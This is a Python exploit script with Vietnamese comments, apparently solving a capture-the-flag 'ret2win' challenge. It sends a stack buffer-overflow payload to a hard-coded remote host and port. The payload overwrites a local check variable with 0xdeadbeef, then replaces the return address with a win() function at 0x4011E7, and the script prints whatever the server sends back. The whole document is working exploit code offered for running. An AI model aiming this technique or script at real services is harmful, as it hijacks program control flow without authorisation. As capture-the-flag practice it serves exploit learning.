#!/usr/bin/env python3
# Chim`_loi — ret2win: BOF ghi đè biến check thành 0xdeadbeef rồi return về win().
import socket, struct, sys, time

HOST, PORT = (sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else ("103.116.52.180", 33621)
def p64(x): return struct.pack("<Q", x)
def p32(x): return struct.pack("<I", x)

WIN = 0x4011E7
# buffer tại rbp-0x50; biến check tại rbp-0x4 (offset 0x4c); saved rbp 0x50; ret 0x58
payload = b"A" * 0x4C + p32(0xDEADBEEF) + p64(0) + p64(WIN)

s = socket.create_connection((HOST, PORT), timeout=15); s.settimeout(4)
time.sleep(0.5); s.sendall(payload)
buf = b""
try:
    while True:
        d = s.recv(4096)
        if not d: break
        buf += d
except socket.timeout:
    pass
print(buf.decode("latin1"))
